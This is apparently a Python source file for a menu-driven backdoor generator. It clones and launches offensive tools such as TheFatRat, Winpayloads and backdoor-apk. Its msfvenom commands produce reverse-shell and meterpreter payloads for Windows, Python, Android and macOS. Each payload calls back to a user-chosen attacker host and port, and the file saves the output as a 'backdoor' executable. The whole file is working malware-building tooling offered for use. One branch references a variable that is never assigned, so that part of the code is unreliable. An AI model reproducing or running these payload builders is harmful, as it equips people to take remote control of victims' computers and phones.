#!/usr/bin/python3

import os
import time
from colorama import Fore
import requests

logo = f"""{Fore.MAGENTA}
╦  ┌─┐╦  ╦┌─┐╦═╗┌─┐┌┬┐
║  │ │╚╗╔╝├┤ ╠╦╝└─┐ │ 
╩═╝└─┘ ╚╝ └─┘╩╚═└─┘ ┴
    With love!
    By: Euronymou5
    [Version: v1]
    
"""

def tools():
  os.system("clear")
  print(logo)
  print(f'''{Fore.BLUE}
  [1] TheFatRat - TheFatRat is an exploiting tool which compiles a malware with famous payload, and then the compiled maware can be executed on Linux , Windows , Mac and Android
  
  [2] KitHack - Kithack is a framework designed to automate the process of downloading and installing different tools for penetration testing, with a special option that allows you to generate cross-platform backdoors using the Metasploit Framework.
  
  [3] Winpayloads - Generator of undetectable payloads in Windows.
  
  [4] Backdoor-Apk - Add a backdoor to any APK file
  
  [~] Soon more...
  
  [00] Back to main menu
  
  [99] Exit
  ''')
  b = input('\n>> ')
  if b == "1":
    if os.path.exists('tools/TheFatRat'):
      print(f'{Fore.GREEN}\n[!] TheFatRat already exists!')
      if ans == "y" or ans == "Y":
        os.system("bash tools/TheFatRat/fatrat")
      elif ans == "n" or ans == "N":
         tools()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        tools()
    else:
      print(f'\n{Fore.CYAN}[~] Installing TheFatRat...')
      os.system("git clone https://github.com/Screetsec/TheFatRat && mv 'TheFatRat' tools/ && chmod +x tools/TheFatRat/setup.sh && bash tools/TheFatRat/setup.sh")
      tools()
  elif b == "2":
     if os.path.exists('tools/KitHack'):
      print(f'{Fore.GREEN}\n[!] KitHack already exists!')
      ans = input('\n[?] You want to run the tool [Y/n]: ')
      if ans == "y" or ans == "Y":
        os.system("python3 tools/KitHack/KitHack.py")
      elif ans == "n" or ans == "N":
         tools()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        tools()
     else:
      print(f'\n{Fore.CYAN}[~] Installing KitHack...')
      os.system("git clone https://github.com/AdrMXR/KitHack && mv 'KitHack' tools/ && bash tools/KitHack/install.sh")
      tools()
  elif b == "3":
     if os.path.exists('tools/Winpayloads'):
      print(f'{Fore.GREEN}\n[!] Winpayloads already exists!')
      ans = input('\n[?] You want to run the tool [Y/n]: ')
      if ans == "y" or ans == "Y":
        os.system("python tools/Winpayloads/WinPayloads.py")
      elif ans == "n" or ans == "N":
         tools()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        tools()
     else:
      print(f'\n{Fore.CYAN}[~] Installing Winpayloads...')
      os.system("git clone https://github.com/nccgroup/Winpayloads.git && mv 'Winpayloads' tools/ && chmod +x tools/Winpayloads/setup.sh && bash tools/Winpayloads/setup.sh")
      tools()
  elif b == "4":
     if os.path.exists('tools/backdoor-apk'):
      print(f'{Fore.GREEN}\n[!] Backdoor-APK already exists!')
      ans = input('\n[?] You want to run the tool [Y/n]: ')
      if ans == "y" or ans == "Y":
        os.system("bash tools/backdoor-apk/backdoor-apk.sh")
      elif ans == "n" or ans == "N":
         tools()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        tools()
     else:
       print(f'\n{Fore.CYAN}[~] Installing Backdoor-APK...')
       os.system("git clone https://github.com/dana-at-cp/backdoor-apk.git && mv 'backdoor-apk' tools/")
       print('\n[~] Backdoor-APK successfully installed.')
       time.sleep(2)
       tools()
  elif b == "99":
     exit()
  elif b == "00":
     main()
  else:
    print(f'\n{Fore.RED}[!] Wrong option.')
    time.sleep(2)
    tools()

def gen():
   os.system("clear")
   print(logo)
   print(f'''{Fore.BLUE}
   [1] Windows backdoors
   
   [2] Python backdoors
   
   [3] Android backdoors
   
   [4] MAC OS backdoors
      
   [00] Back to main menu
   
   [99] Exit
   ''')
   var = input('\n>> ')
   if var == "1":
      print('''
      [~] Select a payload to use
      
      [~] File extension: .exe
      
      [1] windows/x64/meterpreter_reverse_tcp
      
      [2] windows/x64/meterpreter/reverse_tcp
      
      [3] windows/x64/powershell_reverse_tcp
      
      [4] windows/x64/shell_reverse_tcp
      
      [5] windows/meterpreter_reverse_tcp
      
      [6] windows/meterpreter/reverse_tcp
      
      [7] windows/meterpreter/reverse_tcp_dns
      
      [8] windows/powershell_reverse_tcp
      
      [9] windows/shell_reverse_tcp
      
      [00] Back to main menu
      
      [99] Exit
      ''')
      var = input('\n>> ')
      if var == "1":
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == "2":
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '3':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/x64/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '4':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '5':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '6':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '7':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '8':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/powershell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '9':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe > output/{name}.exe')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.exe')
        time.sleep(3)
        gen()
      elif var == '00':
         gen()
      elif var == '99':
         exit()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        gen()
   elif var == '2':
      print('''
      [~] Select a payload to use
      
      [~] File extension: .py
      
      [1] python/meterpreter_reverse_tcp
      
      [2] python/meterpreter/reverse_tcp
      
      [3] python/shell_reverse_tcp
      
      [4] python/shell_reverse_tcp_ssl
      
      [00] Back to main menu
      
      [99] Exit
      ''')
      lol = input('\n>> ')
      if lol == '1':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p python/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > output/{name}.py')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.py')
        time.sleep(3)
        gen()
      elif lol == '2':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p python/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw > output/{name}.py')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.py')
        time.sleep(3)
        gen()
      elif lol == '3':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p python/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw > output/{name}.py')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.py')
        time.sleep(3)
        gen()
      elif lol == '4':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p python/shell_reverse_tcp_ssl LHOST={lhost} LPORT={lport} -f raw > output/{name}.py')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.py')
        time.sleep(3)
        gen()
      elif lol == '00':
         gen()
      elif lol == '99':
         exit()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        gen()
   # --- Android --- #
   elif var == '3':
      print('''
      [~] Select a payload to use
      
      [~] File extension: .apk
      
      [1] android/meterpreter_reverse_tcp
      
      [2] android/meterpreter/reverse_tcp
      
      [3] android/shell/reverse_tcp
      
      [00] Back to main menu
      
      [99] Exit
      ''')
      var = input('\n>> ')
      if var == "1":
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p android/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} R > output/{name}.apk')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.apk')
        time.sleep(3)
        gen()
      elif var == "2":
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > output/{name}.apk')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.apk')
        time.sleep(3)
        gen()
      elif var == "3":
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p android/shell/reverse_tcp LHOST={lhost} LPORT={lport} R > output/{name}.apk')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.apk')
        time.sleep(3)
        gen()
      elif var == '00':
         gen()
      elif var == '99':
         exit()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        gen()
   elif var == '4':
      print('''
      [~] Select a payload to use
      
      [~] File extension: .macho
      
      [1] osx/x64/meterpreter_reverse_tcp
      
      [2] osx/x64/meterpreter/reverse_tcp
      
      [3] osx/x64/shell_reverse_tcp
      
      [4] osx/x86/shell_reverse_tcp
      
      [00] Back to main menu
      
      [99] Exit
      ''')
      var = input('\n>> ')
      if var == '1':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={lhost} LPORT={lport} -f macho > output/{name}.macho')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.macho')
        time.sleep(3)
        gen()
      elif var == '2':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho > output/{name}.macho')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.macho')
        time.sleep(3)
        gen()
      elif var == '3':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p osx/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho > output/{name}.macho')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.macho')
        time.sleep(3)
        gen()
      elif var == '4':
        lhost = input('\n[~] LHOST: ')
        lport = input('\n[~] LPORT: ')
        name = input('\n[~] Enter a name for the file: ')
        os.system(f'systemctl start postgresql && msfvenom -p osx/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f macho > output/{name}.macho')
        print(f'\n{Fore.GREEN}[~] Successfully generated backdoor: output/{name}.macho')
        time.sleep(3)
        gen()
      elif var == "00":
         gen()
      elif var == '99':
         exit()
      else:
        print(f'\n{Fore.RED}[!] Wrong option.')
        time.sleep(2)
        gen()
   elif var == "00":
      main()
   elif var == "99":
      exit()
   else:
    print(f'\n{Fore.RED}[!] Wrong option.')
    time.sleep(2)
    gen()     

def main():
  os.system("clear")
  print(logo)
  try:
    print(f'''{Fore.BLUE}\n
|--------------------------------------|
|[1] Backdoor generating tools         |
|                                      |
|[2] Generate backdoor with msfvenom   |
|                                      |
|[99] Exit                             |
|--------------------------------------|
    ''')
    a = input('\n>> ')
    if a == "1":
       tools()
    elif a == "2":
       gen()
    elif a == "99":
       exit()
    else:
      print(f'\n{Fore.RED}[!] Wrong option.')
      time.sleep(2)
      main()
  except KeyboardInterrupt:
     exit()

def check():
   os.system("clear")
   print(logo)
   print(f'\n{Fore.GREEN}[~] Checking internet connection...')
   time.sleep(2)
   try:
     r = requests.get('https://github.com')
     if r.status_code == 200:
        print(f'{Fore.GREEN}\n[~] Connected to the Internet: ✔')
        time.sleep(2)
        pass
   except:
      print(f'{Fore.RED}\n[!] No internet connection: ❌')
      time.sleep(2)
      exit()

check()
main()
